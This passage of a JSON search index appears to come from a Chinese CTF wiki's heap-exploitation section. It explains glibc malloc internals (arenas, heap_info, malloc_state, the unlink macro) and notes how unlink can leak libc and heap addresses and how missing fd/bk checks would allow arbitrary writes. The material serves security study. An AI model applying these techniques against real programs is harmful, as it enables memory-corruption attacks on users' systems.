            "text": "\u5bf9\u4e8e\u4e0d\u540c\u7cfb\u7edf\uff0carena\u6570\u91cf\u7684 \u7ea6\u675f \u5982\u4e0b  For 32 bit systems:\n     Number of arena = 2 * number of cores.\nFor 64 bit systems:\n     Number of arena = 8 * number of cores.  \u663e\u7136\uff0c\u4e0d\u662f\u6bcf\u4e00\u4e2a\u7ebf\u7a0b\u90fd\u4f1a\u6709\u5bf9\u5e94\u7684 arena\u3002\u81f3\u4e8e\u4e3a\u4ec0\u4e4864\u4f4d\u7cfb\u7edf\uff0c\u8981\u90a3\u4e48\u8bbe\u7f6e\uff0c\u6211\u4e5f\u6ca1\u6709\u60f3\u660e\u767d\u3002\u6b64\u5916\uff0c\u56e0\u4e3a\u6bcf\u4e2a\u7cfb\u7edf\u7684\u6838\u6570\u662f\u6709\u9650\u7684\uff0c\u5f53\u7ebf\u7a0b\u6570\u5927\u4e8e\u6838\u6570\u7684\u4e8c\u500d\uff08\u8d85\u7ebf\u7a0b\u6280\u672f\uff09\u65f6\uff0c\u5c31\u5fc5\u7136\u6709\u7ebf\u7a0b\u5904\u4e8e\u7b49\u5f85\u72b6\u6001\uff0c\u6240\u4ee5\u6ca1\u6709\u5fc5\u8981\u4e3a\u6bcf\u4e2a\u7ebf\u7a0b\u5206\u914d\u4e00\u4e2a arena\u3002", 
            "title": "arena \u6570\u91cf"
        }, 
        {
            "location": "/pwn/heap/heap_structure/#arena_2", 
            "text": "\u5f85\u8865\u5145\u3002", 
            "title": "arena \u5206\u914d\u89c4\u5219"
        }, 
        {
            "location": "/pwn/heap/heap_structure/#_6", 
            "text": "\u4e0e thread \u4e0d\u540c\u7684\u662f\uff0cmain_arena \u5e76\u4e0d\u5728\u7533\u8bf7\u7684 heap \u4e2d\uff0c\u800c\u662f\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf\uff0c\u5728 libc.so \u7684\u6570\u636e\u6bb5\u3002", 
            "title": "\u533a\u522b"
        }, 
        {
            "location": "/pwn/heap/heap_structure/#heap_info", 
            "text": "\u7a0b\u5e8f\u521a\u5f00\u59cb\u6267\u884c\u65f6\uff0c\u6bcf\u4e2a\u7ebf\u7a0b\u662f\u6ca1\u6709 heap \u533a\u57df\u7684\u3002\u5f53\u5176\u7533\u8bf7\u5185\u5b58\u65f6\uff0c\u5c31\u9700\u8981\u4e00\u4e2a\u7ed3\u6784\u6765\u8bb0\u5f55\u5bf9\u5e94\u7684\u4fe1\u606f\uff0c\u800cheap_info \u7684\u4f5c\u7528\u5c31\u662f\u8fd9\u4e2a\u3002\u800c\u4e14\u5f53\u8be5heap\u7684\u8d44\u6e90\u88ab\u4f7f\u7528\u5b8c\u540e\uff0c\u5c31\u5fc5\u987b\u5f97\u518d\u6b21\u7533\u8bf7\u5185\u5b58\u4e86\u3002\u6b64\u5916\uff0c\u4e00\u822c\u7533\u8bf7\u7684heap \u662f\u4e0d\u8fde\u7eed\u7684\uff0c\u56e0\u6b64\u9700\u8981\u8bb0\u5f55\u4e0d\u540cheap\u4e4b\u95f4\u7684\u94fe\u63a5\u7ed3\u6784\u3002  \u8be5\u6570\u636e\u7ed3\u6784\u662f\u4e13\u95e8\u4e3a\u4ece Memory Mapping Segment \u5904\u7533\u8bf7\u7684\u5185\u5b58\u51c6\u5907\u7684\uff0c\u5373\u4e3a\u975e\u4e3b\u7ebf\u7a0b\u51c6\u5907\u7684\u3002  \u4e3b\u7ebf\u7a0b\u53ef\u4ee5\u901a\u8fc7 sbrk() \u51fd\u6570\u6269\u5c55 program break location \u83b7\u5f97\uff08\u76f4\u5230\u89e6\u53caMemory Mapping Segment\uff09\uff0c\u53ea\u6709\u4e00\u4e2aheap\uff0c\u6ca1\u6709 heap_info \u6570\u636e\u7ed3\u6784\u3002  heap_info \u7684\u4e3b\u8981\u7ed3\u6784\u5982\u4e0b  #define HEAP_MIN_SIZE (32 * 1024)  #ifndef HEAP_MAX_SIZE  # ifdef DEFAULT_MMAP_THRESHOLD_MAX  #  define HEAP_MAX_SIZE (2 * DEFAULT_MMAP_THRESHOLD_MAX)  # else  #  define HEAP_MAX_SIZE (1024 * 1024)  /* must be a power of two */  # endif  #endif  /* HEAP_MIN_SIZE and HEAP_MAX_SIZE limit the size of mmap()ed heaps     that are dynamically created for multi-threaded programs.  The     maximum size must be a power of two, for fast determination of     which heap belongs to a chunk.  It should be much larger than the     mmap threshold, so that requests with a size just below that     threshold can be fulfilled without creating too many heaps.  */  /***************************************************************************/  /* A heap is a single contiguous memory region holding (coalesceable)     malloc_chunks.  It is allocated with mmap() and always starts at an     address aligned to HEAP_MAX_SIZE.  */  typedef   struct   _heap_info  { \n   mstate   ar_ptr ;   /* Arena for this heap. */ \n   struct   _heap_info   * prev ;   /* Previous heap. */ \n   size_t   size ;     /* Current size in bytes. */ \n   size_t   mprotect_size ;   /* Size in bytes that has been mprotected                             PROT_READ|PROT_WRITE.  */ \n   /* Make sure the following data is properly aligned, particularly       that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of       MALLOC_ALIGNMENT. */ \n   char   pad [ - 6   *   SIZE_SZ     MALLOC_ALIGN_MASK ];  }   heap_info ;   \u8be5\u7ed3\u6784\u4e3b\u8981\u662f\u63cf\u8ff0\u5806\u7684\u57fa\u672c\u4fe1\u606f\uff0c\u5305\u62ec   \u5806\u5bf9\u5e94\u7684 arena \u7684\u5730\u5740  \u7531\u4e8e\u4e00\u4e2a\u7ebf\u7a0b\u7533\u8bf7\u4e00\u4e2a\u5806\u4e4b\u540e\uff0c\u53ef\u80fd\u4f1a\u4f7f\u7528\u5b8c\uff0c\u4e4b\u540e\u5c31\u5fc5\u987b\u5f97\u518d\u6b21\u7533\u8bf7\u3002\u56e0\u6b64\uff0c\u4e00\u4e2a\u53ef\u80fd\u4f1a\u6709\u591a\u4e2a\u5806\u3002prev\u5373\u8bb0\u5f55\u4e86\u4e0a\u4e00\u4e2a heap_info \u7684\u5730\u5740\u3002\u8fd9\u91cc\u53ef\u4ee5\u770b\u5230\u6bcf\u4e2a\u5806\u7684 heap_info \u662f\u901a\u8fc7\u5355\u5411\u94fe\u8868\u8fdb\u884c\u94fe\u63a5\u7684\u3002  size \u8868\u793a\u5f53\u524d\u5806\u7684\u5927\u5c0f  \u6700\u540e\u4e00\u90e8\u5206\u786e\u4fdd\u5bf9\u9f50\uff08 \u8fd9\u91cc\u8d1f\u6570\u4f7f\u7528\u7684\u7f18\u7531\u662f\u4ec0\u4e48\u5462 \uff1f\uff09   \u770b\u8d77\u6765\u8be5\u7ed3\u6784\u5e94\u8be5\u662f\u76f8\u5f53\u91cd\u8981\u7684\uff0c\u4f46\u662f\u5982\u679c\u5982\u679c\u6211\u4eec\u4ed4\u7ec6\u770b\u5b8c\u6574\u4e2a malloc \u7684\u5b9e\u73b0\u7684\u8bdd\uff0c\u5c31\u4f1a\u53d1\u73b0\u5b83\u51fa\u73b0\u7684\u9891\u7387\u5e76\u4e0d\u9ad8\u3002", 
            "title": "heap_info"
        }, 
        {
            "location": "/pwn/heap/heap_structure/#malloc_state", 
            "text": "\u8be5\u7ed3\u6784\u7528\u4e8e\u7ba1\u7406\u5806\uff0c\u8bb0\u5f55\u6bcf\u4e2a arena \u5f53\u524d\u7533\u8bf7\u7684\u5185\u5b58\u7684\u5177\u4f53\u72b6\u6001\uff0c\u6bd4\u5982\u8bf4\u662f\u5426\u6709\u7a7a\u95f2chunk\uff0c\u6709\u4ec0\u4e48\u5927\u5c0f\u7684\u7a7a\u95f2chunk \u7b49\u7b49\u3002\u65e0\u8bba\u662f thread arena \u8fd8\u662f main arena\uff0c\u5b83\u4eec\u90fd\u53ea\u6709\u4e00\u4e2a malloc state \u7ed3\u6784\u3002\u7531\u4e8e thread \u7684 arena \u53ef\u80fd\u6709\u591a\u4e2a\uff0cmalloc state\u7ed3\u6784\u4f1a\u5728\u6700\u65b0\u7533\u8bf7\u7684arena\u4e2d\u3002  \u6ce8\u610f\uff0cmain arena \u7684 malloc_state \u5e76\u4e0d\u662f heap segment \u7684\u4e00\u90e8\u5206\uff0c\u800c\u662f\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf\uff0c\u5b58\u50a8\u5728 libc.so \u7684\u6570\u636e\u6bb5\u3002  \u5176\u7ed3\u6784\u5982\u4e0b  struct   malloc_state   { \n     /* Serialize access.  */ \n     __libc_lock_define (,   mutex ); \n\n     /* Flags (formerly in max_fast).  */ \n     int   flags ; \n\n     /* Fastbins */ \n     mfastbinptr   fastbinsY [   NFASTBINS   ]; \n\n     /* Base of the topmost chunk -- not otherwise kept in a bin */ \n     mchunkptr   top ; \n\n     /* The remainder from the most recent split of a small request */ \n     mchunkptr   last_remainder ; \n\n     /* Normal bins packed as described above */ \n     mchunkptr   bins [   NBINS   *   2   -   2   ]; \n\n     /* Bitmap of bins, help to speed up the process of determinating if a given bin is definitely empty.*/ \n     unsigned   int   binmap [   BINMAPSIZE   ]; \n\n     /* Linked list, points to the next arena */ \n     struct   malloc_state   * next ; \n\n     /* Linked list for free arenas.  Access to this field is serialized         by free_list_lock in arena.c.  */ \n     struct   malloc_state   * next_free ; \n\n     /* Number of threads attached to this arena.  0 if the arena is on         the free list.  Access to this field is serialized by         free_list_lock in arena.c.  */ \n     INTERNAL_SIZE_T   attached_threads ; \n\n     /* Memory allocated from the system in this arena.  */ \n     INTERNAL_SIZE_T   system_mem ; \n     INTERNAL_SIZE_T   max_system_mem ;  };     __libc_lock_define(, mutex);   \u8be5\u53d8\u91cf\u7528\u4e8e\u63a7\u5236\u7a0b\u5e8f\u4e32\u884c\u8bbf\u95ee\u540c\u4e00\u4e2a\u5206\u914d\u533a\uff0c\u5f53\u4e00\u4e2a\u7ebf\u7a0b\u83b7\u53d6\u4e86\u5206\u914d\u533a\u4e4b\u540e\uff0c\u5176\u5b83\u7ebf\u7a0b\u8981\u60f3\u8bbf\u95ee\u8be5\u5206\u914d\u533a\uff0c\u5c31\u5fc5\u987b\u7b49\u5f85\u8be5\u7ebf\u7a0b\u5206\u914d\u5b8c\u6210\u5019\u624d\u80fd\u591f\u4f7f\u7528\u3002     flags   flags\u8bb0\u5f55\u4e86\u5206\u914d\u533a\u7684\u4e00\u4e9b\u6807\u5fd7\uff0c\u6bd4\u5982 bit0 \u8bb0\u5f55\u4e86\u5206\u914d\u533a\u662f\u5426\u6709 fast bin chunk \uff0cbit1 \u6807\u8bc6\u5206\u914d\u533a\u662f\u5426\u80fd\u8fd4\u56de\u8fde\u7eed\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\u3002\u5177\u4f53\u5982\u4e0b     /*     FASTCHUNKS_BIT held in max_fast indicates that there are probably     some fastbin chunks. It is set true on entering a chunk into any     fastbin, and cleared only in malloc_consolidate.     The truth value is inverted so that have_fastchunks will be true     upon startup (since statics are zero-filled), simplifying     initialization checks.   */  #define FASTCHUNKS_BIT (1U)  #define have_fastchunks(M) (((M)- flags   FASTCHUNKS_BIT) == 0)  #define clear_fastchunks(M) catomic_or( (M)- flags, FASTCHUNKS_BIT)  #define set_fastchunks(M) catomic_and( (M)- flags, ~FASTCHUNKS_BIT)  /*     NONCONTIGUOUS_BIT indicates that MORECORE does not return contiguous     regions.  Otherwise, contiguity is exploited in merging together,     when possible, results from consecutive MORECORE calls.     The initial value comes from MORECORE_CONTIGUOUS, but is     changed dynamically if mmap is ever used as an sbrk substitute.   */  #define NONCONTIGUOUS_BIT (2U)  #define contiguous(M) (((M)- flags   NONCONTIGUOUS_BIT) == 0)  #define noncontiguous(M) (((M)- flags   NONCONTIGUOUS_BIT) != 0)  #define set_noncontiguous(M) ((M)- flags |= NONCONTIGUOUS_BIT)  #define set_contiguous(M) ((M)- flags  = ~NONCONTIGUOUS_BIT)  /* ARENA_CORRUPTION_BIT is set if a memory corruption was detected on the     arena.  Such an arena is no longer used to allocate chunks.  Chunks     allocated in that arena before detecting corruption are not freed.  */  #define ARENA_CORRUPTION_BIT (4U)  #define arena_is_corrupt(A) (((A)- flags   ARENA_CORRUPTION_BIT))  #define set_arena_corrupt(A) ((A)- flags |= ARENA_CORRUPTION_BIT)    fastbinsY[NFASTBINS]  \u5b58\u653e\u6bcf\u4e2a fast chunk \u94fe\u8868\u5934\u90e8\u7684\u6307\u9488    top  \u6307\u5411\u5206\u914d\u533a\u7684 top chunk    last_reminder  \u6700\u65b0\u7684 chunk \u5206\u5272\u4e4b\u540e\u5269\u4e0b\u7684\u90a3\u90e8\u5206    bins  \u7528\u4e8e\u5b58\u50a8 unstored bin\uff0csmall bins \u548c large bins \u7684 chunk \u94fe\u8868\u3002    binmap  ptmalloc \u7528\u4e00\u4e2a bit \u6765\u6807\u8bc6\u67d0\u4e00\u4e2a bin \u4e2d\u662f\u5426\u5305\u542b\u7a7a\u95f2 chunk \u3002", 
            "title": "malloc_state"
        }, 
        {
            "location": "/pwn/heap/heap_structure/#malloc_par", 
            "text": "\uff01\uff01\u5f85\u8865\u5145\uff01\uff01", 
            "title": "malloc_par"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/", 
            "text": "\u6df1\u5165\u7406\u89e3\u5806\u7684\u5b9e\u73b0\n\n\n\u4ed4\u7ec6\u60f3\u4e00\u4e0b\uff0c\u4efb\u4f55\u5806\u7684\u5b9e\u73b0\u90fd\u9700\u8981\u4ece\u4ee5\u4e0b\u4e24\u4e2a\u89d2\u5ea6\u8003\u8651\u76f8\u5e94\u7684\u95ee\u9898\n\n\n\n\n\u5b8f\u89c2\u89d2\u5ea6\n\n\n\u521b\u5efa\u5806\n\n\n\u5806\u521d\u59cb\u5316\n\n\n\u5220\u9664\u5806\n\n\n\n\n\n\n\u5fae\u89c2\u89d2\u5ea6\n\n\n\u7533\u8bf7\u5185\u5b58\u5757\n\n\n\u91ca\u653e\u5185\u5b58\u5757\n\n\n\n\n\n\n\n\n\u5f53\u7136\uff0c\u8fd9\u4e9b\u90fd\u662f\u6bd4\u8f83\u9ad8\u5c42\u9762\u7684\u60f3\u6cd5\uff0c\u4e0d\u540c\u7684\u5806\u7684\u5e95\u5c42\u5b9e\u73b0\u4f1a\u6709\u6240\u4e0d\u540c\u3002\n\n\n\u5806\u5b9e\u73b0\u6982\u89c8\n\n\n\u5806\u521d\u59cb\u5316\n\n\n\u5806\u521d\u59cb\u5316\u662f\u5728\u7528\u6237\u7b2c\u4e00\u6b21\u7533\u8bf7\u5185\u5b58\u65f6\u6267\u884c malloc_consolidate \u518d\u6267\u884c malloc_init_state \u5b9e\u73b0\u7684\u3002\u8fd9\u91cc\u4e0d\u505a\u8fc7\u591a\u8bb2\u89e3\u3002\u53ef\u4ee5\u53c2\u89c1 \nmalloc_state \u76f8\u5173\u51fd\u6570\n\u3002\n\n\n\u521b\u5efa\u5806\n\n\n\u53cc\u5411\u94fe\u8868\u76f8\u5173\u64cd\u4f5c\n\n\nunlink\n\n\nunlink \u7528\u6765\u5c06\u4e00\u4e2a\u53cc\u5411\u94fe\u8868\uff08\u53ea\u5b58\u50a8\u7a7a\u95f2\u7684 chunk\uff09\u4e2d\u7684\u4e00\u4e2a\u5143\u7d20\u53d6\u51fa\u6765\uff0c\u53ef\u80fd\u5728\u4ee5\u4e0b\u5730\u65b9\u4f7f\u7528\n\n\n\n\nmalloc\n\n\n\u4ece\u6070\u597d\u5927\u5c0f\u5408\u9002\u7684 large bin \u4e2d\u83b7\u53d6 chunk\u3002\n\n\n\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f fastbin \u4e0e small bin \u5c31\u6ca1\u6709\u4f7f\u7528 unlink\uff0c\u8fd9\u5c31\u662f\u4e3a\u4ec0\u4e48\u6f0f\u6d1e\u4f1a\u7ecf\u5e38\u51fa\u73b0\u5728\u5b83\u4eec\u8fd9\u91cc\u7684\u539f\u56e0\u3002\n\n\n\u4f9d\u6b21\u904d\u5386\u5904\u7406 unsorted bin \u65f6\u4e5f\u6ca1\u6709\u4f7f\u7528 unlink \u7684\u3002\n\n\n\n\n\n\n\u4ece\u6bd4\u8bf7\u6c42\u7684 chunk \u6240\u5728\u7684 bin \u5927\u7684 bin \u4e2d\u53d6 chunk\u3002\n\n\n\n\n\n\nFree\n\n\n\u540e\u5411\u5408\u5e76\uff0c\u5408\u5e76\u7269\u7406\u76f8\u90bb\u4f4e\u5730\u5740\u7a7a\u95f2 chunk\u3002\n\n\n\u524d\u5411\u5408\u5e76\uff0c\u5408\u5e76\u7269\u7406\u76f8\u90bb\u9ad8\u5730\u5740\u7a7a\u95f2 chunk\uff08\u9664\u4e86 top chunk\uff09\u3002\n\n\n\n\n\n\nmalloc_consolidate\n\n\n\u540e\u5411\u5408\u5e76\uff0c\u5408\u5e76\u7269\u7406\u76f8\u90bb\u4f4e\u5730\u5740\u7a7a\u95f2 chunk\u3002\n\n\n\u524d\u5411\u5408\u5e76\uff0c\u5408\u5e76\u7269\u7406\u76f8\u90bb\u9ad8\u5730\u5740\u7a7a\u95f2 chunk\uff08\u9664\u4e86 top chunk\uff09\u3002\n\n\n\n\n\n\nrealloc\n\n\n\u524d\u5411\u6269\u5c55\uff0c\u5408\u5e76\u7269\u7406\u76f8\u90bb\u9ad8\u5730\u5740\u7a7a\u95f2 chunk\uff08\u9664\u4e86top chunk\uff09\u3002\n\n\n\n\n\n\n\n\n\u7531\u4e8e unlink \u4f7f\u7528\u975e\u5e38\u9891\u7e41\uff0c\u6240\u4ee5 unlink \u88ab\u5b9e\u73b0\u4e3a\u4e86\u4e00\u4e2a\u5b8f\uff0c\u5982\u4e0b\n\n\n/* Take a chunk off a bin list */\n\n\n// unlink p\n\n\n#define unlink(AV, P, BK, FD) {                                            \\\n\n\n    \n// \u7531\u4e8e P \u5df2\u7ecf\u5728\u53cc\u5411\u94fe\u8868\u4e2d\uff0c\u6240\u4ee5\u6709\u4e24\u4e2a\u5730\u65b9\u8bb0\u5f55\u5176\u5927\u5c0f\uff0c\u6240\u4ee5\u68c0\u67e5\u4e00\u4e0b\u5176\u5927\u5c0f\u662f\u5426\u4e00\u81f4\u3002\n\n    \nif\n \n(\n__builtin_expect\n \n(\nchunksize\n(\nP\n)\n \n!=\n \nprev_size\n \n(\nnext_chunk\n(\nP\n)),\n \n0\n))\n      \\\n      \nmalloc_printerr\n \n(\ncorrupted size vs. prev_size\n);\n               \\\n    \nFD\n \n=\n \nP\n-\nfd\n;\n                                                                      \\\n    \nBK\n \n=\n \nP\n-\nbk\n;\n                                                                      \\\n    \n// \u9632\u6b62\u653b\u51fb\u8005\u7b80\u5355\u7be1\u6539\u7a7a\u95f2\u7684 chunk \u7684 fd \u4e0e bk \u6765\u5b9e\u73b0\u4efb\u610f\u5199\u7684\u6548\u679c\u3002\n\n    \nif\n \n(\n__builtin_expect\n \n(\nFD\n-\nbk\n \n!=\n \nP\n \n||\n \nBK\n-\nfd\n \n!=\n \nP\n,\n \n0\n))\n                      \\\n      \nmalloc_printerr\n \n(\ncheck_action\n,\n \ncorrupted double-linked list\n,\n \nP\n,\n \nAV\n);\n  \\\n    \nelse\n \n{\n                                                                      \\\n        \nFD\n-\nbk\n \n=\n \nBK\n;\n                                                              \\\n        \nBK\n-\nfd\n \n=\n \nFD\n;\n                                                              \\\n        \n// \u4e0b\u9762\u4e3b\u8981\u8003\u8651 P \u5bf9\u5e94\u7684 nextsize \u53cc\u5411\u94fe\u8868\u7684\u4fee\u6539\n\n        \nif\n \n(\n!\nin_smallbin_range\n \n(\nchunksize_nomask\n \n(\nP\n))\n                              \\\n            \n// \u5982\u679cP-\nfd_nextsize\u4e3a NULL\uff0c\u8868\u660e P \u672a\u63d2\u5165\u5230 nextsize \u94fe\u8868\u4e2d\u3002\n\n            \n// \u90a3\u4e48\u5176\u5b9e\u4e5f\u5c31\u6ca1\u6709\u5fc5\u8981\u5bf9 nextsize \u5b57\u6bb5\u8fdb\u884c\u4fee\u6539\u4e86\u3002\n\n            \n// \u8fd9\u91cc\u6ca1\u6709\u53bb\u5224\u65ad bk_nextsize \u5b57\u6bb5\uff0c\u53ef\u80fd\u4f1a\u51fa\u95ee\u9898\u3002\n\n            \n \n__builtin_expect\n \n(\nP\n-\nfd_nextsize\n \n!=\n \nNULL\n,\n \n0\n))\n \n{\n                      \\\n            \n// \u7c7b\u4f3c\u4e8e\u5c0f\u7684 chunk \u7684\u68c0\u67e5\u601d\u8def\n\n            \nif\n \n(\n__builtin_expect\n \n(\nP\n-\nfd_nextsize\n-\nbk_nextsize\n \n!=\n \nP\n,\n \n0\n)\n              \\\n                \n||\n \n__builtin_expect\n \n(\nP\n-\nbk_nextsize\n-\nfd_nextsize\n \n!=\n \nP\n,\n \n0\n))\n    \\\n              \nmalloc_printerr\n \n(\ncheck_action\n,\n                                      \\\n                               \ncorrupted double-linked list (not small)\n,\n    \\\n                               \nP\n,\n \nAV\n);\n                                              \\\n            \n// \u8fd9\u91cc\u8bf4\u660e P \u5df2\u7ecf\u5728 nextsize \u94fe\u8868\u4e2d\u4e86\u3002\n\n            \n// \u5982\u679c FD \u6ca1\u6709\u5728 nextsize \u94fe\u8868\u4e2d\n\n            \nif\n \n(\nFD\n-\nfd_nextsize\n \n==\n \nNULL\n)\n \n{\n                                      \\\n                \n// \u5982\u679c nextsize \u4e32\u8d77\u6765\u7684\u53cc\u94fe\u8868\u53ea\u6709 P \u672c\u8eab\uff0c\u90a3\u5c31\u76f4\u63a5\u62ff\u8d70 P\n\n                \n// \u4ee4 FD \u4e3a nextsize \u4e32\u8d77\u6765\u7684\n\n                \nif\n \n(\nP\n-\nfd_nextsize\n \n==\n \nP\n)\n                                      \\\n                  \nFD\n-\nfd_nextsize\n \n=\n \nFD\n-\nbk_nextsize\n \n=\n \nFD\n;\n                      \\\n                \nelse\n \n{\n                                                              \\\n                \n// \u5426\u5219\u6211\u4eec\u9700\u8981\u5c06 FD \u63d2\u5165\u5230 nextsize \u5f62\u6210\u7684\u53cc\u94fe\u8868\u4e2d\n\n                    \nFD\n-\nfd_nextsize\n \n=\n \nP\n-\nfd_nextsize\n;\n                              \\\n                    \nFD\n-\nbk_nextsize\n \n=\n \nP\n-\nbk_nextsize\n;\n                              \\\n                    \nP\n-\nfd_nextsize\n-\nbk_nextsize\n \n=\n \nFD\n;\n                              \\\n                    \nP\n-\nbk_nextsize\n-\nfd_nextsize\n \n=\n \nFD\n;\n                              \\\n                  \n}\n                                                              \\\n              \n}\n \nelse\n \n{\n                                                              \\\n                \n// \u5982\u679c\u5728\u7684\u8bdd\uff0c\u76f4\u63a5\u62ff\u8d70\u5373\u53ef\n\n                \nP\n-\nfd_nextsize\n-\nbk_nextsize\n \n=\n \nP\n-\nbk_nextsize\n;\n                      \\\n                \nP\n-\nbk_nextsize\n-\nfd_nextsize\n \n=\n \nP\n-\nfd_nextsize\n;\n                      \\\n              \n}\n                                                                      \\\n          \n}\n                                                                      \\\n      \n}\n                                                                              \\\n\n}\n\n\n\n\n\n\u8fd9\u91cc\u6211\u4eec\u4ee5 small bin \u7684 unlink \u4e3a\u4f8b\u5b50\u4ecb\u7ecd\u4e00\u4e0b\u3002\u5bf9\u4e8e large bin \u7684 unlink\uff0c\u4e0e\u5176\u7c7b\u4f3c\uff0c\u53ea\u662f\u591a\u4e86\u4e00\u4e2anextsize \u7684\u5904\u7406\u3002\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\uff0c \nP \u6700\u540e\u7684 fd \u548c bk \u6307\u9488\u5e76\u6ca1\u6709\u53d1\u751f\u53d8\u5316\n\uff0c\u4f46\u662f\u5f53\u6211\u4eec\u53bb\u904d\u5386\u6574\u4e2a\u53cc\u5411\u94fe\u8868\u65f6\uff0c\u5df2\u7ecf\u904d\u5386\u4e0d\u5230\u5bf9\u5e94\u7684\u94fe\u8868\u4e86\u3002\u8fd9\u4e00\u70b9\u6ca1\u6709\u53d8\u5316\u8fd8\u662f\u5f88\u6709\u7528\u5904\u7684\uff0c\u56e0\u4e3a\u6211\u4eec\u6709\u65f6\u5019\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e2a\u65b9\u6cd5\u6765\u6cc4\u6f0f\u5730\u5740\n\n\n\n\nlibc \u5730\u5740\n\n\nP \u4f4d\u4e8e\u53cc\u5411\u94fe\u8868\u5934\u90e8\uff0cbk \u6cc4\u6f0f\n\n\nP \u4f4d\u4e8e\u53cc\u5411\u94fe\u8868\u5c3e\u90e8\uff0cfd \u6cc4\u6f0f\n\n\n\u53cc\u5411\u94fe\u8868\u53ea\u5305\u542b\u4e00\u4e2a\u7a7a\u95f2 chunk \u65f6\uff0cP \u4f4d\u4e8e\u53cc\u5411\u94fe\u8868\u4e2d\uff0cfd \u548c bk \u5747\u53ef\u4ee5\u6cc4\u6f0f\n\n\n\n\n\n\n\u6cc4\u6f0f\u5806\u5730\u5740\uff0c\u53cc\u5411\u94fe\u8868\u5305\u542b\u591a\u4e2a\u7a7a\u95f2 chunk\n\n\nP \u4f4d\u4e8e\u53cc\u5411\u94fe\u8868\u5934\u90e8\uff0cfd \u6cc4\u6f0f\n\n\nP \u4f4d\u4e8e\u53cc\u5411\u94fe\u8868\u4e2d\uff0cfd \u548c bk \u5747\u53ef\u4ee5\u6cc4\u6f0f\n\n\nP \u4f4d\u4e8e\u53cc\u5411\u94fe\u8868\u5c3e\u90e8\uff0cbk \u6cc4\u6f0f\n\n\n\n\n\n\n\n\n\u6ce8\u610f\n\n\n\n\n\u8fd9\u91cc\u7684\u5934\u90e8\u6307\u7684\u662f bin \u7684 fd \u6307\u5411\u7684 chunk\uff0c\u5373\u53cc\u5411\u94fe\u8868\u4e2d\u6700\u65b0\u52a0\u5165\u7684 chunk\u3002\n\n\n\u8fd9\u91cc\u7684\u5c3e\u90e8\u6307\u7684\u662f bin \u7684 bk \u6307\u5411\u7684 chunk\uff0c\u5373\u53cc\u5411\u94fe\u8868\u4e2d\u6700\u5148\u52a0\u5165\u7684 chunk\u3002\n\n\n\n\n\u540c\u65f6\uff0c\u5bf9\u4e8e\u65e0\u8bba\u662f\u5bf9\u4e8e fd\uff0cbk \u8fd8\u662f fd_nextsize \uff0cbk_nextsize\uff0c\u7a0b\u5e8f\u90fd\u4f1a\u68c0\u6d4b fd \u548c bk \u662f\u5426\u6ee1\u8db3\u5bf9\u5e94\u7684\u8981\u6c42\u3002\n\n\n// fd bk\n\n\nif\n \n(\n__builtin_expect\n \n(\nFD\n-\nbk\n \n!=\n \nP\n \n||\n \nBK\n-\nfd\n \n!=\n \nP\n,\n \n0\n))\n                      \\\n  \nmalloc_printerr\n \n(\ncheck_action\n,\n \ncorrupted double-linked list\n,\n \nP\n,\n \nAV\n);\n  \\\n\n  \n// next_size related\n\n              \nif\n \n(\n__builtin_expect\n \n(\nP\n-\nfd_nextsize\n-\nbk_nextsize\n \n!=\n \nP\n,\n \n0\n)\n              \\\n                \n||\n \n__builtin_expect\n \n(\nP\n-\nbk_nextsize\n-\nfd_nextsize\n \n!=\n \nP\n,\n \n0\n))\n    \\\n              \nmalloc_printerr\n \n(\ncheck_action\n,\n                                      \\\n                               \ncorrupted double-linked list (not small)\n,\n    \\\n                               \nP\n,\n \nAV\n);\n   \n\n\n\n\n\u770b\u8d77\u6765\u4f3c\u4e4e\u5f88\u6b63\u5e38\u3002\u6211\u4eec\u4ee5 fd \u548c bk \u4e3a\u4f8b\uff0cP \u7684 forward chunk \u7684 bk \u5f88\u81ea\u7136\u662f P \uff0c\u540c\u6837 P \u7684 backward chunk \u7684 fd \u4e5f\u5f88\u81ea\u7136\u662f P \u3002\u5982\u679c\u6ca1\u6709\u505a\u76f8\u5e94\u7684\u68c0\u67e5\u7684\u8bdd\uff0c\u6211\u4eec\u53ef\u4ee5\u4fee\u6539 P \u7684 fd \u4e0e bk\uff0c\u4ece\u800c\u53ef\u4ee5\u5f88\u5bb9\u6613\u5730\u8fbe\u5230\u4efb\u610f\u5730\u5740\u5199\u7684\u6548\u679c\u3002\u5173\u4e8e\u66f4\u52a0\u8be6\u7ec6\u7684\u4f8b\u5b50\uff0c\u53ef\u4ee5\u53c2\u89c1\u5229\u7528\u90e8\u5206\u7684 unlink \u3002\n\n\n\u6ce8\u610f\uff1a\u5806\u7684\u7b2c\u4e00\u4e2a chunk \u6240\u8bb0\u5f55\u7684 prev_inuse \u4f4d\u9ed8\u8ba4\u4e3a1\u3002\n\n\n\u7533\u8bf7\u5185\u5b58\u5757\n\n\n\u4e00\u822c\u6211\u4eec\u4f1a\u4f7f\u7528 malloc \u51fd\u6570\u6765\u7533\u8bf7\u5185\u5b58\u5757\uff0c\u53ef\u662f\u5f53\u4ed4\u7ec6\u770b glibc \u7684\u6e90\u7801\u5b9e\u73b0\u65f6\uff0c\u5176\u5b9e\u5e76\u6ca1\u6709malloc \u51fd\u6570\u3002\u5176\u5b9e\u8be5\u51fd\u6570\u771f\u6b63\u8c03\u7528\u7684\u662f __libc_malloc \u51fd\u6570\u3002\u4e3a\u4ec0\u4e48\u4e0d\u76f4\u63a5\u5199\u4e2a malloc \u51fd\u6570\u5462\uff0c\u56e0\u4e3a\u6709\u65f6\u5019\u6211\u4eec\u53ef\u80fd\u9700\u8981\u4e0d\u540c\u7684\u540d\u79f0\u3002\u6b64\u5916\uff0c__libc_malloc \u51fd\u6570\u53ea\u662f\u7528\u6765\u7b80\u5355\u5c01\u88c5 _int_malloc \u51fd\u6570\u3002_int_malloc 